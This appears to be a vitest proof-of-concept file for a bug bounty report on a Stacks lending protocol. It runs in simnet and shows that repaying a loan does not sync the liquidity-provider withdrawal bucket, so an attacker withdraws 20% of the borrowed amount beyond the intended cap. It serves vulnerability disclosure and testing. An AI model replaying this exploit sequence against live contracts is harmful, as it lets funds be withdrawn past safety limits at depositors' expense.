import { Cl, ClarityValue } from "@stacks/transactions";
import { beforeEach, describe, expect, it } from "vitest";
import {
  build_price_update,
  getSimnetBlockTime,
  init_pyth,
  set_initial_price,
  set_pyth_time_delta,
} from "./pyth";
import {
  add_collateral,
  initialize_ir,
  initialize_lp,
  initialize_staking_reward,
  mint_token,
  set_allowed_contracts,
  set_asset_cap,
  update_supported_collateral,
} from "./utils";

// Immunefi 99601: repay syncs only the debt bucket, so the next LP withdrawal
// sizes its ceiling from 20% x (L + D). Under a full refill the over-cap is 0.2D.

const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const attacker = accounts.get("wallet_2")!; // both LP and borrower

const SCALING = 100_000_000n;
// Live USDCx values.
const LP_CAP_FACTOR = 20_000_000n; // 20%
const DEBT_CAP_FACTOR = 20_000_000n; // 20%
const REFILL_WINDOW = 36_000n; // seconds
const DECAY_WINDOW = 10_800n; // seconds

const USDC = 100_000_000n; // simnet mock-usdc is 8 decimals
const DUST = 1_000n; // liquidity-provider initialize burn
const DEPOSIT = 2_000n * USDC;
const BORROW = 200n * USDC;
// simnet advances 600 s per block, so a full refill needs 60 blocks.
const FULL_REFILL_BLOCKS = Number(REFILL_WINDOW / 600n);

const ok = (r: any) => expect(r.result).toBeOk(Cl.bool(true));
const capRead = (fn: string) =>
  (simnet.callReadOnlyFn("withdrawal-caps-v1", fn, [], deployer).result as any)
    .value as bigint;
const usdcBalance = (who: ClarityValue) =>
  (simnet.callReadOnlyFn("mock-usdc", "get-balance", [who], deployer).result as any)
    .value.value as bigint;
const stateV1 = () => Cl.contractPrincipal(deployer, "state-v1");
const withdraw = (amount: bigint) =>
  simnet.callPublicFn(
    "liquidity-provider-v1",
    "withdraw",
    [Cl.uint(amount), Cl.principal(attacker)],
    attacker
  );

// Shared setup: live caps, a 2,000 USDC LP position that is also a 200 USDC
// borrower, and a full refill window since the last LP bucket sync.
const setupAttacker = async () => {
  init_pyth(deployer);
  set_pyth_time_delta(7200, deployer);
  set_allowed_contracts(deployer);
  set_asset_cap(deployer, 2n ** 128n - 1n);
  initialize_ir(deployer);
  initialize_staking_reward(deployer);
  initialize_lp(deployer);
  await set_initial_price("mock-usdc", 1n, deployer);
  await set_initial_price("mock-btc", 1n, deployer);
  update_supported_collateral(
    "mock-btc",
    70_000_000,
    80_000_000,
    10_000_000,
    8,
    deployer
  );

  // Caps are set before the attacker's deposit so lp-deposit syncs the buckets.
  ok(
    simnet.callPublicFn(
      "withdrawal-caps-v1",
      "set-lp-cap",
      [Cl.uint(LP_CAP_FACTOR)],
      deployer
    )
  );
  ok(
    simnet.callPublicFn(
      "withdrawal-caps-v1",
      "set-debt-cap",
      [Cl.uint(DEBT_CAP_FACTOR)],
      deployer
    )
  );
  ok(
    simnet.callPublicFn(
      "withdrawal-caps-v1",
      "set-refill-time-window",
      [Cl.uint(REFILL_WINDOW)],
      deployer
    )
  );
  ok(
    simnet.callPublicFn(
      "withdrawal-caps-v1",
      "set-decay-time-window",
      [Cl.uint(DECAY_WINDOW)],
      deployer
    )
  );

  mint_token("mock-usdc", Number(DEPOSIT), attacker);
  ok(
    simnet.callPublicFn(
      "liquidity-provider-v1",
      "deposit",
      [Cl.uint(DEPOSIT), Cl.principal(attacker)],
      attacker
    )
  );

  mint_token("mock-btc", Number(2_000n * USDC), attacker);
  add_collateral("mock-btc", Number(2_000n * USDC), deployer, attacker);

  // Full refill window since the LP bucket's last sync.
  simnet.mineEmptyBlocks(FULL_REFILL_BLOCKS + 1);
  ok(
    simnet.callPublicFn(
      "borrower-v1",
      "borrow",
      [Cl.buffer(build_price_update()), Cl.uint(BORROW), Cl.none()],
      attacker
    )
  );
};

describe("Immunefi 99601 - repay does not sync the LP withdrawal bucket", () => {
  beforeEach(async () => {
    await setupAttacker();
  });

  it("control: the same withdrawal without the repay reverts on the LP cap", () => {
    // Same state as the attack right before its repay: 2,000 USDC deposited,
    // 200 USDC borrowed out, so state-v1 holds L = 1,800.00001 USDC.
    const liquidity = usdcBalance(stateV1());
    expect(liquidity).toBe(DEPOSIT + DUST - BORROW);
    expect(usdcBalance(Cl.principal(attacker))).toBe(BORROW);

    const intendedCap = (liquidity * LP_CAP_FACTOR) / SCALING;
    // The exact amount the attack withdraws: 20% of L + D.
    const attackAmount = ((liquidity + BORROW) * LP_CAP_FACTOR) / SCALING;
    expect(attackAmount).toBeGreaterThan(intendedCap);

    const res = withdraw(attackAmount);
    expect(res.result).toBeErr(Cl.uint(120002)); // ERR-WITHDRAWAL-LP-CAP-EXCEEDED

    console.log(
      JSON.stringify({
        test: "control",
        liquidity: liquidity.toString(),
        borrow: BORROW.toString(),
        intendedCap: intendedCap.toString(),
        attemptedWithdrawal: attackAmount.toString(),
        result: "err u120002",
      })
    );
  });

  it("repay lands without an LP sync and the next withdrawal spends 0.2D over the cap", () => {
    const liquidity = usdcBalance(stateV1());
    expect(liquidity).toBe(DEPOSIT + DUST - BORROW);

    const lpUpdateBeforeRepay = capRead("get-last-lp-bucket-update");
    const lpBucketBeforeRepay = capRead("get-lp-bucket");

    // The attacker repays the 200 USDC principal.
    ok(
      simnet.callPublicFn(
        "borrower-v1",
        "repay",
        [Cl.uint(BORROW), Cl.none()],
        attacker
      )
    );

    // The repay moved the tokens but did not sync the LP bucket.
    expect(capRead("get-last-lp-bucket-update")).toBe(lpUpdateBeforeRepay);
    expect(capRead("get-lp-bucket")).toBe(lpBucketBeforeRepay);

    const liquidityAfterRepay = usdcBalance(stateV1());
    expect(liquidityAfterRepay).toBe(liquidity + BORROW);
    expect(usdcBalance(Cl.principal(attacker))).toBe(0n);

    const intendedCap = (liquidity * LP_CAP_FACTOR) / SCALING;
    const actualCap = (liquidityAfterRepay * LP_CAP_FACTOR) / SCALING;
    const overCap = actualCap - intendedCap;

    // Full refill since the last LP sync: e >= W, so the report's
    // min(0.2D, 0.2(L+D) * e/W) collapses to 0.2D.
    expect(overCap).toBe((BORROW * LP_CAP_FACTOR) / SCALING);
    expect(overCap).toBeGreaterThan(0n);

    const elapsed = getSimnetBlockTime() - lpUpdateBeforeRepay;
    expect(elapsed).toBeGreaterThanOrEqual(REFILL_WINDOW);

    const res = withdraw(actualCap);
    ok(res);
    expect(usdcBalance(Cl.principal(attacker))).toBe(actualCap);
    expect(capRead("get-lp-bucket")).toBe(0n);

    // The ceiling the withdrawal actually used, from the contract's own print.
    const sync = res.events.find(
      (e: any) => e.data?.value?.value?.["action"]?.value === "sync-lp-bucket"
    ) as any;
    expect(sync).toBeDefined();
    const ceiling = sync.data.value.value["new-lp-bucket-value"].value as bigint;
    expect(ceiling).toBe(actualCap);
    expect(sync.data.value.value["old-lp-bucket-value"].value as bigint).toBe(
      lpBucketBeforeRepay
    );

    console.log(
      JSON.stringify({
        test: "attack",
        liquidity: liquidity.toString(),
        borrow: BORROW.toString(),
        liquidityAfterRepay: liquidityAfterRepay.toString(),
        intendedCap: intendedCap.toString(),
        actualCap: actualCap.toString(),
        overCap: overCap.toString(),
        elapsedSeconds: elapsed.toString(),
        refillWindow: REFILL_WINDOW.toString(),
        withdrawal: actualCap.toString(),
        result: "ok",
      })
    );
  });
});
